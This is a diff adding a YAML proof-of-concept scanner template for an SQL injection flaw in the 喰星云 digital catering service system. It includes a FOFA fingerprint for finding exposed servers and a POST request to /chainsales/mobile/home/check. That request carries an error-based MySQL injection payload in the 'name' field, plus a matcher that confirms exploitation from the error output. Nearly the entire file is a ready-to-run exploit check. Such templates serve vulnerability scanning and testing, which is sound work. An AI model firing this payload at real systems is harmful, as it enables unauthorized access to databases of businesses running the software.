@@ -1,0 +1,21 @@
+id: poc-yaml-can-xing-yun-home-check-sqli
+info:
+  name: 喰星云-数字化餐饮服务系统 home_check SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 喰星云-数字化餐饮服务系统
+  fofa: body="tmp_md5_pwd"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /chainsales/mobile/home/check
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,md5({{.t1}})))),0x7e),8475)
+    AND '1%'='1&pwd=123
+  expression: "status_code == 200 && \ncontains(body,\"SQLSTATE\") &&\ncontains(body,\"\
+    General error:\") &&\ncontains(body,\"GTID set specification\") &&\ncontains(body,t2)\n"
+transport: http
